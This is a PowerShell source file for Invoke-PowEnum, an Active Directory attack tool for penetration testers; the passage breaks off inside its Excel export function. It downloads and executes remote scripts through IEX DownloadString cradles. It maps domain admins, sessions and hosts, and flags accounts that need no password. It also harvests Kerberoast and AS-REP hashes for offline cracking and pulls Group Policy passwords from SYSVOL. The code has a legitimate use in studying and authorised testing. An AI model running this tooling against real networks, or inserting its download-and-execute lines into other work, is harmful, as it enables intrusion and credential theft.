#requires -version 2

function Invoke-PowEnum
{
<# 
	.SYNOPSIS 
		Enumerates and exports AD data using select PowerView functions and combines the output into a single .xlsx.
		Author: Andrew Allen
		License: BSD 3-Clause
		
	.DESCRIPTION 
		Enumerates domain info using PowerSploit's PowerView
		then combines the exported .csv's into a tabbed .xlsx spreadsheet.
		
	.NOTES 
		Requires Excel to be installed on your system. 
		Requires PowerView.
		
	.LINK 
		Credit & inspiration goes to:
		PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
		Export to CSV: https://gist.github.com/gregklee/b01348787af0b47d8b30
	
	.PARAMETER FQDN

		Specify the FQDN to use, defaults to the current domain.
		
	.PARAMETER Mode
	
		Basic: Basic Enumeration:
				UsersAndGroups Speadsheet
					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, misc privileged groups, All Domain Users, All Domain Groups, etc.
				HostsAndSessions Spreadsheet
					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts, etc.
		Roasting: Kerberoast and ASREPRoast
		LargeEnv: Basic Enumeration without Get-DomainUser/Group/Computer
		Special: Enumerates Users With Specific Account Attributes:
			Disabled Account
			Enabled, Password Not Required
			Enabled, Password Doesn't Expire
			Enabled, Password Doesn't Expire & Not Required
			Enabled, Smartcard Required
			Enabled, Smartcard Required, Password Not Required
			Enabled, Smartcard Required, Password Doesn't Expire
		SYSVOL: Searches SYSVOL on DC
			Group Policy Passwords
			Potential SYSVOL Logon Scripts
			
		
	.EXAMPLE 
		
		PS C:\> Invoke-PowEnum
		
		Basic enumeration only using current domain and credential. Grabs PowerView from github.
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -PoweviewURL http://10.0.0.10/PowerView.ps1
		
		Perform basic enumeration for a specific domain using PowerView.ps1 at the set URL
		
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Domain test.com
		
		Perform basic enumeration for a specific domain (use FQDN).
		
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Mode Special
		
		Perform enumeration of user accounts with specific attributes.
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Credential test.domain.com\username -Mode Special
		
		Perform enumeration of user accounts with specific attributes using an alternate credential. Be sure to use FQDN.
#>

[CmdletBinding(DefaultParameterSetName="FQDN")]
Param(
	[Parameter(Position = 0)]
	[String]
	$FQDN,
	
	[Parameter(Position = 1)]
	[ValidateSet('Basic', 'Roasting', 'LargeEnv', 'Special', 'SYSVOL','Forest')]
	[String]
	$Mode = 'Basic',

	[Parameter(Position = 2)]
	[String]
	$PowerViewURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
	
	[Parameter(Position = 2)]
	[String]
	$ASREPRoastURL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1",
	
	[Parameter(Position = 2)]
	[String]
	$GetGPPPasswordURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-GPPPassword.ps1",
	
	[Parameter(ParameterSetName = 'Credential')]
	[Management.Automation.PSCredential]
	[Management.Automation.CredentialAttribute()]
	$Credential,
	
	[Parameter(Position = 3)]
	[Switch]
	$NoExcel
)

	#Supprese Errors and Warnings
	$ErrorActionPreference = 'Continue'
	$WarningPreference = "SilentlyContinue"

	#Start Stopwatch
	$stopwatch = [system.diagnostics.stopwatch]::startnew()

	#Create webclient cradle with proxy creds
	$webclient = New-Object System.Net.WebClient
	$webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

	$Summary = $null
	
	#Download PowerView from specified URL or from GitHub.
	try {
		Write-Host "[>]Downloading Powerview | " -NoNewLine
		
		if (Test-Path .\PowerView.ps1){
			Write-Host "[Skipping Download] " -NoNewLine -ForegroundColor Yellow
			Write-Host "PowerView.ps1 Present | " -NoNewLine
			IEX $webclient.DownloadString('.\PowerView.ps1')
			Write-Host "Success" -ForegroundColor Green
		}
		else {	
			Write-Host "$PowerViewURL | " -NoNewLine
			IEX $webclient.DownloadString($PowerViewURL)
			Write-Host "Success" -ForegroundColor Green
		}
	}catch {Write-Host "Error: Are You Using The Dev Branch of Powerview? $_.Exception.GetType().FullName" -ForegroundColor Red; Return}

	#Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
	if ($Credential -ne $null){
		try{
			$NetworkCredential = $Credential.GetNetworkCredential()
			$Domain = $NetworkCredential.Domain
			$UserName = $NetworkCredential.UserName
			Write-Host "Impersonate user: $Domain\$Username | " -NoNewLine
			$Null = Invoke-UserImpersonation -Credential $Credential
			Write-Host "Success" -ForegroundColor Green 
		}catch{Write-Host "Error: Are You Using The Dev Branch of Powerview? $_.Exception.GetType().FullName" -ForegroundColor Red; Return}
	}	

	#Grab Local Domain
	Write-Host "Enumeration Domain: " -ForegroundColor Cyan -NoNewLine
	if (!$FQDN) {
		$FQDN = (Get-Domain).Name
		Write-Host "$FQDN" -ForegroundColor Cyan
	}
	if (!$FQDN) {
		Write-Host "Unable to retrieve domain (make sure the FQDN, username, and password are correct), exiting..." -ForegroundColor Red;
		Return
	}

	#Set up spreadsheet arrary and count
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()

	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan

	if ($Mode -eq 'Basic') {
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-DAs
		PowEnum-EAs
		PowEnum-BltAdmins
		PowEnum-DCLocalAdmins
		PowEnum-SchemaAdmins
		PowEnum-AccountOperators
		PowEnum-BackupOperators
		PowEnum-PrintOperators
		PowEnum-ServerOperators
		PowEnum-GPCreatorsOwners
		PowEnum-CryptographicOperators
		PowEnum-GroupManagers
		PowEnum-Users
		PowEnum-Groups
		PowEnum-CreateSummary
		PowEnum-ExcelFile -SpreadsheetName Basic-UsersAndGroups
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-NetSess
		PowEnum-DCs
		PowEnum-IPs
		PowEnum-Subnets
		PowEnum-DNSRecords
		PowEnum-WinRM
		PowEnum-FileServers
		PowEnum-Computers
		PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
	}
	elseif ($Mode -eq 'Roasting') {
		try {
			Write-Host "[>]Downloading ASREPRoast | " -NoNewLine
			Write-Host "$ASREPRoastURL | " -NoNewLine
			IEX $webclient.DownloadString($ASREPRoastURL)
			Write-Host "Success" -ForegroundColor Green
			PowEnum-ASREPRoast
		}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
		PowEnum-Kerberoast
		PowEnum-ExcelFile -SpreadsheetName Roasting
	}
	elseif ($Mode -eq 'LargeEnv') {
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-DAs
		PowEnum-EAs
		PowEnum-BltAdmins
		PowEnum-DCLocalAdmins
		PowEnum-SchemaAdmins
		PowEnum-AccountOperators
		PowEnum-BackupOperators
		PowEnum-PrintOperators
		PowEnum-ServerOperators
		PowEnum-GPCreatorsOwners
		PowEnum-CryptographicOperators
		PowEnum-GroupManagers
		PowEnum-CreateSummary
		PowEnum-ExcelFile -SpreadsheetName Large-Users
		
		$script:ExportSheetCount = 1
		$script:ExportSheetFileArray = @()
		PowEnum-NetSess
		PowEnum-DCs
		PowEnum-Subnets
		PowEnum-DNSRecords
		PowEnum-WinRM
		PowEnum-FileServers
		PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
	}
	elseif ($Mode -eq 'Special') {
		PowEnum-Disabled
		PowEnum-PwNotReq
		PowEnum-PwNotExp
		PowEnum-PwNotExpireNotReq
		PowEnum-SmartCardReq
		PowEnum-SmartCardReqPwNotReq
		PowEnum-SmartCardReqPwNotExp
		PowEnum-ExcelFile -SpreadsheetName Special
	}
	elseif ($Mode -eq 'SYSVOL') {
		try {
			Write-Host "[>]Downloading Get-GPPPassword | " -NoNewLine
			Write-Host "$GetGPPPasswordURL | " -NoNewLine
			IEX $webclient.DownloadString($GetGPPPasswordURL)
			Write-Host "Success" -ForegroundColor Green
			PowEnum-GPPPassword
		}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
		PowEnum-SYSVOLFiles	
		PowEnum-ExcelFile -SpreadsheetName SYSVOL
	}
	elseif ($Mode -eq 'Forest') {
		PowEnum-DomainTrusts
		PowEnum-ForeignUsers
		PowEnum-ForeignGroupMembers
		PowEnum-ExcelFile -SpreadsheetName SYSVOL
	}
	else {
		Write-Host "Incorrect Mode Selected"
		Return
}

#reverting Token
if ($Credential -ne $null){
	try{
		$NetworkCredential = $Credential.GetNetworkCredential()
		$UserName = $NetworkCredential.UserName
		Write-Host "Reverting Token from: $FQDN\$Username | " -NoNewLine
		$Null = Invoke-RevertToSelf
		Write-Host "Success" -ForegroundColor Green 
	}catch{Write-Host "Error" -ForegroundColor Red; Return}
}	

$script:ExportSheetCount = $null
$script:ExportSheetFileArray = $null
$Summary = $null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

$stopwatch.Stop()
$elapsedtime = "{0:N0}" -f ($stopwatch.Elapsed.TotalSeconds)
Write-Host $("Running Time: " + $elapsedtime + "s") -ForegroundColor Cyan
Write-Host "Current Date/Time: $(Get-Date)" -ForegroundColor Cyan
Write-Host "Exiting..." -ForegroundColor Yellow
}

function PowEnum-DCs {
	try {
		Write-Host "[ ]Domain Controllers | " -NoNewLine
		$temp = Get-DomainController -Domain $FQDN | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
		PowEnum-ExportAndCount -TypeEnum DCs
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-DAs {
	try {
		Write-Host "[ ]Domain Admins | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"DAs"}})
		PowEnum-ExportAndCount -TypeEnum DAs
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-EAs {
	try {
		Write-Host "[ ]Enterprise Admins | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"EAs"}})
		PowEnum-ExportAndCount -TypeEnum EAs
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SchemaAdmins {
	try {
		Write-Host "[ ]Schema Admins | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Schema Admins" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"SchemaAdmins"}})
		PowEnum-ExportAndCount -TypeEnum SchemaAdmins
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-AccountOperators {
	try {
		Write-Host "[ ]Account Operators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Account Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"AcctOperators"}})
		PowEnum-ExportAndCount -TypeEnum AcctOperators
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-BackupOperators {
	try {
		Write-Host "[ ]Backup Operators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Backup Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BackupOperators"}})
		PowEnum-ExportAndCount -TypeEnum BackupOperators
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-PrintOperators {
	try {
		Write-Host "[ ]Print Operators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Print Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"PrintOperators"}})
		PowEnum-ExportAndCount -TypeEnum PrintOperators
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-ServerOperators {
	try {
		Write-Host "[ ]Server Operators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Server Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"ServerOperators"}})
		PowEnum-ExportAndCount -TypeEnum ServerOperators
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-GPCreatorsOwners {
	try {
		Write-Host "[ ]Group Policy Creators Owners | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Group Policy Creators Owners" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"GPCreatorsOwners"}})
		PowEnum-ExportAndCount -TypeEnum GPCreatorsOwners
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-CryptographicOperators {
	try {
		Write-Host "[ ]Cryptographic Operators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Cryptographic Operators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"CryptographicOperators"}})
		PowEnum-ExportAndCount -TypeEnum CryptographicOperators
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-BltAdmins {
	try {
		Write-Host "[ ]Builtin Administrators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $FQDN | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		$script:Summary += ($temp | Select-Object *,@{N="Source";E={"BltAdmins"}})
		PowEnum-ExportAndCount -TypeEnum BltAdmins
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Users {
	try {
		Write-Host "[ ]All Domain Users (this could take a while) | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | 
			Select-Object samaccountname, description, @{N="Groups";E={ 
				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
				$ConvertedGroupNames -join "; "}}, 
				pwdlastset, admincount, distinguishedname, userprincipalname, serviceprincipalname, useraccountcontrol, iscriticalsystemobject
		PowEnum-ExportAndCount -TypeEnum AllUsers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Groups {
	try {
		Write-Host "[ ]All Domain Groups (this could take a while) | " -NoNewLine
		$temp = Get-DomainGroup -Domain $FQDN | Select-Object samaccountname, admincount, description, iscriticalsystemobject, 
			@{N="MemberOf";E={ 
			$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
			$ConvertedGroupNames -join "; "}}
		PowEnum-ExportAndCount -TypeEnum AllGroups
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Computers {
	try {
		Write-Host "[ ]All Domain Computers (this could take a while) | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname, 
				@{N="Groups";E={ 
				$ConvertedGroupNames = ForEach-Object {$_.MemberOf | Convert-ADName -OutputType NT4 -Domain $FQDN}; 
				$ConvertedGroupNames -join "; "}}
		PowEnum-ExportAndCount -TypeEnum AllComputers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-IPs {
	try {
		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN | Resolve-IPAddress
		PowEnum-ExportAndCount -TypeEnum IPs
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-DCLocalAdmins {
	try {
		Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
		
		$temp = $null
		
		Get-DomainController | ForEach-Object {
			$Domain_Controller_Hostname = $_
			
			#Get Local Admins On DC using WinNT method because the other method doesnt properly account for the local admin SID being the domain SID
			$DomainController_LocalAdmin = Get-NetLocalGroupMember -Method WinNT -ComputerName $Domain_Controller_Hostname
			
			#If the local admin is a group and domain then recursively get all members and add to table
			$DomainController_LocalAdmin_DomainGroupMembers = $DomainController_LocalAdmin | 
				Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | 
					ForEach-Object {$_.AccountName.Substring($_.AccountName.IndexOf("\")+1)} | 
						Get-DomainGroupMember -Recurse -Domain $FQDN | 
							Select-Object @{N="ComputerName";E={"$Domain_Controller_Hostname"}}, 
								@{N="AccountName";E={-join ($_.MemberDomain, "\", $_.MemberName)}}, 
								@{N="SID";E={-join ($_.MemberSID)}}, 
								@{N="IsGroup";E={"$False"}}, 
								@{N="IsDomain";E={"$True"}},
								@{N="GroupName";E={"$($_.GroupName)"}}
			
			#Get all local admins with an empty groupname and change the $null value to a string (prevents excel export issues)
			$DomainController_LocalAdmin_DomainGroupMembers = $DomainController_LocalAdmin_DomainGroupMembers |
			  Select-Object ComputerName,AccountName,SID,IsGroup,IsDomain, @{
					Label = "GroupName"
					Expression = { if ($_.GroupName) { $_.GroupName } else { "No Data" } }
			 }
			
			$DomainController_LocalAdmin += $DomainController_LocalAdmin_DomainGroupMembers |
				Select-Object ComputerName, GroupName, AccountName, SID, isGroup, isDomain
			
			$script:Summary += ($DomainController_LocalAdmin | 
				Select-Object @{N="MemberName";E={$_.AccountName.Substring($_.AccountName.IndexOf("\")+1)}},
					@{N="MemberDomain";E={$_.AccountName.Substring(0,$_.AccountName.IndexOf("\"))}},
					@{N="Source";E={"DCLocalAdmins"}}
			)
		
			$temp += $DomainController_LocalAdmin
		}
		
		PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Subnets {
	try {
		Write-Host "[ ]Domain Subnets | " -NoNewLine
		$temp = Get-DomainSubnet -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum Subnets
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-DNSRecords {
	#try {
		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
		$DnsZones = Get-DomainDNSZone -Domain $FQDN
		if ($DnsZones -ne $null) {
			$temp = $DnsZones | Get-DomainDNSRecord -ErrorAction SilentlyContinue
		}
		PowEnum-ExportAndCount -TypeEnum DNSRecords
	#}catch {Write-Host ""}
}

function PowEnum-NetSess {
	try {
		Write-Host "[ ]Net Sessions | " -NoNewLine
		$temp = Get-DomainController -Domain $FQDN | Get-NetSession | ?{$_.UserName -notlike "*$"}
		PowEnum-ExportAndCount -TypeEnum NetSess
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-WinRM {
	try {
		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
		$temp = Get-DomainComputer -Domain $FQDN -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
		PowEnum-ExportAndCount -TypeEnum WinRM
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Disabled {
	try{
		Write-Host "[ ]Disabled Account | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum Disabled
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-PwNotReq {
	try{
		Write-Host "[ ]Enabled, Password Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum PwNotReq
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-PwNotExp {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpire
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-PwNotExpireNotReq {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpireNotReq
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SmartCardReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReq
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotReq
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExp {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExp
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExpNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $FQDN | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExpNotReq
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-ASREPRoast {
	try{
		Write-Host "[ ]ASREProast (John Format) | " -NoNewLine
		$temp = Invoke-ASREPRoast -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum ASREPRoast
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-Kerberoast {
	try{
		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $FQDN -WarningAction silentlyContinue
		PowEnum-ExportAndCount -TypeEnum Kerberoast
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-GPPPassword {
	try{
		Write-Host "[ ]GPP Password(s) | " -NoNewLine
		$temp = Get-GPPPassword -Server $FQDN
		PowEnum-ExportAndCount -TypeEnum GPPPassword
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-SYSVOLFiles {
	try{
		Write-Host "[ ]Potential logon scripts on \\$FQDN\SYSVOL | " -NoNewLine
		$temp = Find-InterestingFile -Path \\$FQDN\sysvol -Include @('*.vbs', '*.bat', '*.ps1', '.cmd') -Verbose
		PowEnum-ExportAndCount -TypeEnum SYSVOLFiles
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-GroupManagers {
	try{
		Write-Host "[ ]AD Group Managers | " -NoNewLine
		$temp = Get-DomainManagedSecurityGroup -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum GroupManagers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-FileServers {
	try{
		Write-Host "[ ]Potential Fileservers | " -NoNewLine
		$temp = Get-DomainFileServer -Domain $FQDN | Select-Object @{Name='FileServerName';Expression={$_}}
		PowEnum-ExportAndCount -TypeEnum FileServers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-DomainTrusts {
	try{
		Write-Host "[ ]Domain Trusts | " -NoNewLine
		$temp = Get-DomainTrust -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum DomainTrusts
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-ForeignUsers {
	try{
		Write-Host "[ ]Foreign [Domain] Users | " -NoNewLine
		$temp = Get-DomainForeignUser -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum ForeignUsers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-ForeignGroupMembers {
	try{
		Write-Host "[ ]Foreign [Domain] Group Members | " -NoNewLine
		$temp = Get-DomainForeignGroupMember -Domain $FQDN
		PowEnum-ExportAndCount -TypeEnum ForeignGroupMembers
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-CreateSummary {
	try{
		Write-Host "[ ]Creating Summary | " -NoNewLine
		$HVTList = $script:Summary 
		
		$NewHVTList=@()
		foreach ($HVTUser in $HVTList) {
			$UserObjectList = $HVTList | Where-Object {$_.MemberName -contains $HVTUser.MemberName}
			$UsernameCount = $($UserObjectList | Measure-Object).Count

			if ($NewHVTList.MemberName -contains $HVTUser.MemberName) {continue}
			elseif ($HVTUser.MemberObjectClass -eq "Source") {continue}
			elseif ($UsernameCount -gt 1) {
					$GroupList = $($UserObjectList | Select-Object -Property Source -Unique)
					$GroupListString = $($GroupList.Source -join ",")
					$CombinedUserObject = ($UserObjectList | Select-Object -First 1 MemberName,MemberDomain,@{n='Sources';e={$GroupListString}})
					$NewHVTList += $CombinedUserObject
			}
			else{
				$CombinedUserObject = ($UserObjectList | Select-Object -First 1 MemberName,MemberDomain,@{n='Sources';e={$_.Source}})
				$NewHVTList += $CombinedUserObject
			}
		}
		
		$temp = $NewHVTList
		PowEnum-ExportAndCount -TypeEnum Summary
	}catch {Write-Host "Error: $_.Exception.GetType().FullName" -ForegroundColor Red}
}

function PowEnum-ExportAndCount {
	Param(
		[Parameter(Position = 0)]
		[String]
		$TypeEnum
	)
	
	if($temp -ne $null){
		
		#Grab the file name and the full path
		$exportfilename = $FQDN.Substring(0,$FQDN.IndexOf(".")) + '_' + $TypeEnum + '.csv'
		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
		
		#Perform the actual export
		$temp | Select-Object * | Export-CSV -NoTypeInformation -Path ('.\' + $exportfilename)

		#Create new file object and add to array
		$ExportSheetFile = new-object psobject
		$ExportSheetFile | add-member NoteProperty Name $exportfilename
		$ExportSheetFile | add-member NoteProperty FullName $exportfilepath
		
		if($TypeEnum -eq "Summary") {
			$TempExportSheetFileArray = @()
			$TempExportSheetFileArray = $script:ExportSheetFileArray 
			$script:ExportSheetFileArray = @()
			$script:ExportSheetFileArray += $ExportSheetFile
			$script:ExportSheetFileArray += $TempExportSheetFileArray
		}
		else {$script:ExportSheetFileArray += $ExportSheetFile}
		
		$count = $temp | measure-object | select-object -expandproperty Count
	}
	if($temp -eq $null){
		$count = 0
	}
	Write-Host "$count Identified" -ForegroundColor Green
	$script:ExportSheetCount++
}

function PowEnum-ExcelFile {
	Param(
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$SpreadsheetName
	)
	if ($NoExcel) {Return}
	
	try {
		Write-Host "[ ]Combining csv file(s) to xlsx | " -NoNewLine
		
		#Exit if enumeration resulting in nothing
		if($script:ExportSheetFileArray.Count -eq 0){Write-Warning "No Data Identified"; Return}
		
		$path = (Get-Item -Path ".\" -Verbose).FullName
		$XLOutput =  $path + "\" + 
			$FQDN + "_" + 
			$SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + 
			$(get-random) + ".xlsx"

		# Create Excel object (visible), workbook and worksheet
		$Excel = New-Object -ComObject excel.application 
		$Excel.visible = $false
		$Excel.sheetsInNewWorkbook = $script:ExportSheetFileArray.Count
		$workbooks = $excel.Workbooks.Add()
		$CSVSheet = 1

		Foreach ($CSV in $script:ExportSheetFileArray) {

			$worksheets = $workbooks.worksheets
			$CSVFullPath = $CSV.FullName
			
